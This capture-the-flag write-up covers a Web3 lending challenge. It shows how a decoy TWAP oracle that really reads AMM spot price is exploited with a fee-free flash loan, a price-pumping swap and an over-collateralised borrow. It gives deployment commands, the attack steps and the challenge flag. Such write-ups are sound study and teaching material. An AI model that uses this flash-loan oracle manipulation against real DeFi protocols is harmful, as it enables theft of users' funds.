<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=7EF700&center=true&vCenter=true&repeat=false&width=300&height=35&lines=Carcara+Markets+" alt="Typing SVG" /></a>

<p><img src="/img/hackincariri.webp" alt="Hack in Cariri" height="600"></p>

</div>

<p align="center"><b>English</b> · <a href="WRITEUP.es.md">Español</a> · <a href="WRITEUP.pt-BR.md">Português (BR)</a></p>

# Carcara Markets — WEB3 · 450 pts · 🔴 HARD

- **Status:** ✅ SOLVED — end-to-end exploit, flag obtained.
- **Flag:** `HIK_WEB3_ORACLE_d6036e30b782007df2b879030f515065`
- **Flag format:** `HIK_[text]_[md5]`
- **Access:** RPC `https://<HOST>` · `GET /instance.json` (instance card) · chainId `31337`
- **Prompt:** *"Tokens, a pool, a price feed, and a lending desk are on chain. Starting balances are on Setup. Make Setup.isSolved() return true."*

---

## 0. TL;DR

1. Setup exposes `dex()`, `flash()`, `lending()`, `oracle()`, `player()`, `usd()` — no source, everything reconstructed via `cast call` + heimdall decompile.
2. The "oracle" promises TWAP (`twapPrice()`), but that function is a decoy constant; the real price used by the lending desk is read straight from the AMM reserves' spot price (`0x50e308f6()` = `usdReserve()*1e18/hikReserve()`), with no protection.
3. Fee-less USD flash loan + swap that pumps the pool price ~439x + deposit of the bought HIK as collateral + borrow at the inflated LTV drains the lending desk; repay the flash loan in the same tx and the flag comes out of the HTTP proof-oracle.

### Chain that landed
1. `flash.flashLoan(1500e18, address(this), "")` -> lends 1500e18 USD with no fee.
2. `dex.call(0x8ac326bd, 1500e18, 0)` (USD-in -> HIK-out) -> reserves move from 100/100 and the HIK price rises from 1e18 to ~439e18.
3. `lending.depositCollateral(~95.2e18 HIK)` + `lending.borrow(9500e18)` -> 90% LTV on collateral with inflated price lets you withdraw almost all of the lending desk's cash.
4. `usd.transfer(flash, 1500e18)` -> repays the flash loan owing nothing.
5. `Setup.isSolved()` -> `true` (`usd.balanceOf(lending) < 1000e18 && usd.balanceOf(flash) >= 2000e18`).
6. `GET /ticket` -> `token = sha256(f"{ticket}:500000000000000000000")` -> `POST /flag` -> flag.

---

## 1. Artifacts

- `instance.json` — pinned instance data (RPC, player, `Setup` address; sensitive values redacted).
- `setup_code.hex` — `Setup` runtime bytecode.
- `setup_decompiled/`, `dex_decompiled/`, `lending_decompiled/`, `flash_decompiled/`, `oracle_decompiled/`, `usd_decompiled/`, `hik_decompiled/` — heimdall (decompile) outputs.
- `dex_sol/`, `lending_sol/`, `flash_sol/`, `oracle_sol/`, `setup_sol/` — Solidity reconstruction from the decompile, used to write the exploit.
- `attacker_proj/` — Foundry project with `src/Attacker.sol` (exploit contract).

## 2. Delivery / validation

- `Setup.isSolved()` must return `true` on-chain (`usd.balanceOf(lending) < 1000e18 && usd.balanceOf(flash) >= 2000e18`).
- HTTP proof: `GET /instance.json` (cookie `hik_team`) -> on-chain exploit -> `GET /ticket` (short TTL) -> `token = sha256(f"{ticket}:{proof}")`, where `proof` is `usd.balanceOf(lending)` post-exploit, in decimal -> `POST /flag {"ticket","token"}` -> `{"flag": "..."}`.

## 3. Analysis

### 3.1 Contract architecture (reversed, no source)

Setup getters: `dex() flash() lending() oracle() player() usd()`.

- **usd** (`Fake USD`/`fUSD`, 18 dec) — ERC20 "stablecoin", `minter() == Setup`.
- **HIK token** (`0xc49330a5...`) — collateral asset, not exposed by a Setup getter (found via `Unresolved_23b872dd(msg.sender)` in the dex/lending bytecode). Player starts with `100e18` HIK.
- **dex** — manual constant-product AMM (no LP token): `store_a` = HIK reserve, `store_b` = `usdReserve()`. Fee 0.3% (`997/1000`, same as Uniswap v2). Real selectors: `0x8ac326bd(amountIn,minOut)` = swap USD-in → HIK-out; `0x1518a0ec(amountIn,minOut)` = swap HIK-in → USD-out; `getAmountOut(amountIn,reserveIn,reserveOut)`; `usdReserve()`; `0x5fad8f7c()` = HIK reserve. Initial reserves: `100e18` HIK / `100e18` USD (price 1:1).
- **oracle** — `twapPrice()` is a decoy constant (always `1e18`); the real function (`0x50e308f6()`) reads the live spot price: `usdReserve()*1e18/hikReserve()` from the dex — no actual TWAP, no protection.
- **lending** — `depositCollateral(uint256)` (`0xbad4a01f`, pull via `transferFrom` of HIK), `borrow(uint256)` (`0xc5ebeaec`): `debt[msg.sender]+amt <= LTV_BPS(9000) * collateral*price/1e18 / 10000`, pays in `usd`. Starts with `10000e18` USD.
- **flash** — usd flash loan (zero fee): `flashLoan(uint256 amount, address borrower, bytes data)` (`0x2bd94e9c`), requires `borrower` to be a contract, calls `borrower.<selector 0x79b2fae8>(amount)` as callback, and at the end checks `balanceOf(this)` after `>=` before ("unpaid" if not repaid). Starts with `2000e18` USD.
- **Setup.isSolved()**: `usd.balanceOf(lending) < 1000e18 && usd.balanceOf(flash) >= 2000e18` — drain the lending desk (>9000e18 USD) without owing on the flash loan.

### 3.2 The bug — spot-price oracle read straight from the AMM reserves (no real TWAP)

`oracle` promises TWAP (the function name `twapPrice`, but it's a dead/decoy constant) and in practice uses the pool's instantaneous price from `dex`. Thin pool (`100e18`/`100e18`) + capital flash loan (`2000e18` USD, no fee) = classic "flash-loan + spot-oracle" manipulation (Harvest/Cheese Bank/bZx-style). Not documented before in the Arsenal — it's a new pattern, not the `web3-mint-on-swap-no-conservation-loop`.

### 3.3 Exploit — 1 atomic tx via contract

`attacker_proj/src/Attacker.sol`:

1. `flash.flashLoan(1500e18, address(this), "")` → flash transfers `1500e18` USD and calls the callback (`fallback()` manually decoding selector `0x79b2fae8` — there is no text name that matches this 4-byte, so the fallback handles the raw calldata instead of trying to find the real name).
2. In the callback: `usd.approve(dex, 1500e18)` + `dex.call(0x8ac326bd, 1500e18, 0)` → buys HIK with all the borrowed USD. Reserves go from `100/100` to `~4.78 HIK / 2100 USD` → price jumps from `1e18` to `~439e18` (439x).
3. Deposits the freshly bought HIK (`~95.2e18`) as collateral (`lending.depositCollateral`).
4. `lending.borrow(9500e18)` — with the inflated price, the 90% LTV lets you borrow far more than the real value of the collateral; the lending desk only has `10000e18`, so `500e18` is left over (`<1000e18` ✓).
5. Repays the flash loan (`usd.transfer(flash, 1500e18)`) — flash goes back to exactly `2000e18` (✓).

```bash
export PATH="$PATH:$HOME/.config/.foundry/bin"
RPC="https://<HOST>"
# instance.json: usd, hik(0xc49330a5...), dex, lending, flash, player PK
forge create src/Attacker.sol:Attacker --private-key $PK --rpc-url "$RPC" --broadcast \
  --constructor-args $USD $HIK $DEX $LENDING $FLASH
cast send $ATTACKER "attack(uint256,uint256)" 1500000000000000000000 9500000000000000000000 \
  --private-key $PK --rpc-url "$RPC" --gas-limit 3000000
cast call $SETUP "isSolved()(bool)" --rpc-url "$RPC"   # -> true
```

Tested first on a local fork (`anvil --fork-url $RPC`) and then on the real instance — same result (`lending=500e18`, `flash=2000e18`, `isSolved()==true`).

### 3.4 Flag — proof

`proof = usd.balanceOf(lending)` after the exploit, in decimal = `"500000000000000000000"` (hit on the first try — same "proof = exact value that `isSolved()` validates, in decimal" pattern as Night Deposit/Voucher Window).

```
GET /instance.json  (cookie hik_team)
cast send ... (exploit above) -> isSolved()==true
GET /ticket -> {"ticket":...}
token = sha256(f"{ticket}:500000000000000000000")
POST /flag {"ticket","token"} -> {"flag":"HIK_WEB3_ORACLE_d6036e30b782007df2b879030f515065"}
```

## 4. What didn't work

There is no record of discarded hypotheses in the original material — only the path that landed on the first try (see 3.4).

## 5. Conclusion / next steps

The exploit landed in 1 atomic tx: a fee-less flash loan to manipulate the AMM's spot price, used directly as the "oracle" by the lending desk, allowing a borrow above the real collateral. Flag confirmed by the HTTP proof-oracle.


---

## Appendix — tools

- `attacker_proj/src/Attacker.sol` — Foundry exploit contract (flash loan + pump swap + deposit + borrow + repay); execution via `forge create` + `cast send` (see 3.3).
- heimdall (decompile) over each contract's runtime bytecode (`*_decompiled/`) to recover selectors and logic without source.
